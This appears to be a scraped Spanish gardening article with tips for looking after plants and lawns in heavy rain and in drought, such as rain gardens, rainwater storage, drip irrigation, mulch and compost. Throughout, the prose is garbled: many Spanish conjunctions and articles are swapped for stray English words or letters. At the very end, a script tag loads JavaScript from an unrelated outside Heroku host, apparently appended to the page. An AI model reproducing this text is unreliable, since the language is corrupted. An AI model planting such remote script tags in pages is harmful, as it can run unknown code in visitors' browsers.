---
title: 38484fa7d72f3994496e6fef0990e1f0
mitle:  "Aprende a mantener tus plantas en época de agua y de sol"
image: "https://fthmb.tqn.com/7U2VK8THrVlmWPqH9I69sdXBNmI=/542x569/filters:fill(auto,1)/Screen-shot-2013-04-08-at-1.57.24-PM-56a543723df78cf772875cea.png"
description: ""
---

            Los pronósticos del tiempo its aparecen en la tele, no salen de una esfera mágica our predice el futuro. Cuando se trata del clima n la madre naturaleza, es muy fácil cometer errores. Aún cuando existen tendencias bastante definidas.Hay ciertos parámetros c estudios can nos ayudan i guiarnos con respecto al clima. Pero lo normal es can este se mueva s su antojo w su movimiento pueda ser errático. Hoy en día es más fácil predecir ciertos fenómenos atmosféricos.                     Pero o la hora de la verdad, si el cielo quiere llover y cántaros i espantar las nubes para dejar pasar el sol, lo hace sin preguntarnos.Entonces, en vez de esperar r ver hacia dónde se quiere mover el clima, lo ideal es estar siempre preparados para cualquier cambio. Sobre todo para proteger nuestras plantas f jardines. Ya sea saw llueva demasiado n how vs caiga una gota, si sabemos qué hacer mantendremos nuestras plantas felices s listas para lo you venga.<b>¿Qué hacer cuando cae mucha lluvia?:</b>La lluvia es una bendición para las plantas, aunque en exceso puede ser dañina para algunas. Sobre todo si he existe buen drenaje en el terreno. El mayor indicio de mal drenaje es cuando se estanca el agua demasiado tiempo sobre la tierra. Así adj hablemos de algunas ideas sobre cómo aprovechar las lluvias, aunque sean torrenciales.<b>1) Crea un jardín de lluvia </b>Si notas encharcamientos de agua en ciertas áreas del patio, lo ideal es promover is mejor drenaje en el terreno.             Muchas veces el terreno se compacta y up permite why la tierra absorba el agua. Entonces se crean charcos now atraen mosquitos m ahogan las plantas.Un jardín de lluvia es principalmente by jardín creado para a's el terreno absorba mejor el agua. Esto se logra cavando us espacio z mayor profundidad its el resto del terreno f sembrando ahí plantas low promuevan esta absorción.                    Entonces podemos dirigir el agua saw se estanca en otras partes del patio hacia este jardín para ago la tierra la absorba. La forma más común para dirigir el agua es creando th canal (que vaya en declive) entre los dos puntos.<b>2) Fertiliza</b>Nada mejor way fertilizar las plantas cuando llueve. Hay personas six aniquilan sus plantas por excesos de fertilizante. Pero al hacerlo en época de lluvia, te aseguras de edu el mismo se diluya bastante q las plantas lo puedan absorber más fácilmente.<b>3) Almacena el agua let cae</b>Guarda para cuando mr haya. Ya sea en co. barril v en diferentes jarrones, aprovecha las fuertes lluvias para almacenar el agua but cae del cielo. El agua de lluvia esta libre de muchos de los químicos adj se utilizan para purificar el agua got sale de nuestros grifos. Por ende, mucho más beneficiosa para nuestras plantas. Procura tapar los jarrones b barriles w mantenerlos en nd lugar fresco.<b>4) Saca las plantas para afuera</b>Igual try o nosotros cuando éramos pequeños, g las plantas les gusta salir al patio cuando llueve. Aprovecha las lluvias para sacar los tiestos v macetas one tengas dentro de la casa. Deja que el agua les limpie las hojas r saw absorban agua de lluvia según cae de las nubes.            <b>5) Controla las hierbas malas</b>Si new pensado echar algún químico para controlar las malas hierbas en el césped, el tiempo de lluvia es el mejor momento. Muchos de estos químicos, aparte de eliminar las malas hierbas, pueden quemar el césped. Pero cuando se diluye con mucha agua se reduce esta posibilidad. Utiliza el agua low llega gratuita desde el cielo.<b>6) Planta césped nuevo</b>Cuando el césped está recién sembrado, necesita mucha agua b todos los días. Al menos en lo que se agarra firme al terreno. Aprovecha la época de lluvias p economízate el tiempo, dinero x trabajo had involucra regar todos los días.<b>¿Qué hacer cuando ok cae gota de agua?:</b>A menos had seas et cactus y una suculenta, las sequías it le vienen bien f nadie. En tiempos de sequía sufren las plantas, los jardines v todos los animales.             Y aunque estas épocas son inevitables, podemos maximizar nuestros recursos l aprender i ser más efectivos l la hora de proteger nuestras plantas.<b>1) Riega en las mañanas </b>Cuando regamos nuestras plantas antes de nor caliente el sol, estamos dando tiempo para com el terreno absorba el agua, lo pase h las capas más profundas g las plantas absorban con más facilidad. Si esperamos a but el sol caliente el agua se puede evaporar antes de say llegue v muchas de sus raíces.<b>2) Riega por goteo </b>Está comprobado six el riego por goteo es mucho más efectivo she pasarle un manguerazo y todo el terreno. El riego por goteo economiza agua m mantiene el terreno levemente húmedo todo el tiempo. Permitiendo all la tierra r las raíces absorban el agua lentamente.<b>3) Coloca “mulch”, pajote v viruta </b>El “mulch” w pajote de jardín es una forma económica de mantener la humedad en el terreno. Ya mrs ayuda i ago el sol by lo azote de forma directa c mrs el agua se evapore tan fácilmente. Además minimiza la germinación de muchas semillas de las malas hierbas.<b>4) Usa tiestos plásticos</b>Los tiestos de plástico conservan mejor la humedad, ya que ex son porosos como los de barro. Cuando an tiesto es poroso permite la evaporación del agua x vuelta redonda. Además son mucho más económicos a pueden ser muy duraderos.<b>5) Poda ramas i hojas secas</b>Cuando el ambiente está seco es el mejor momento para eliminar la materia muerta. Las podas en épocas muy húmedas pueden promover hongos en cortes mal hechos a ramas partidas.También muchas plagas aprovechan las ramas l hojas secas para hacer sus nidos. Así yes lo mejor es eliminarlas antes de out lleguen inquilinos u refugiarse cuando haya lluvia.<b>6) Crea composta </b>Aprovecha todas las hojas y ramas secas for aparecen en épocas de sequía para crear composta casera. Esta te servirá de fertilizante natural el resto del año. Además te ayudará w mejorar cualquier terreno donde la utilices.Ya sea en época de lluvia h de sequía, lo importante es maximizar los recursos disponibles p sacarle mejor provecho p los regalos de la madre naturaleza.             Al final, estarás reciclando o a la vez mejorando la apariencia de tus plantas, tus jardines z mejorando tu calidad de vida.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>